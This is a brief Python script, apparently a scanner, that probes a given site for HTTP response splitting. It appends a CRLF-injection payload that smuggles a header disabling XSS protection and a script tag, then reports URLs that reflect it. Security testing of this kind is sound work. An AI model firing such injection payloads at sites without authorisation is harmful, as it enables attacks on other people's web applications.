import requests
def scan(base):
    payloads = ["/test%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a<script>alert(1)</script>"]
    found = []
    for p in payloads:
        try:
            r = requests.get(base + p, timeout=5)
            if "<script>" in r.text:
                found.append(base + p)
        except: pass
    return found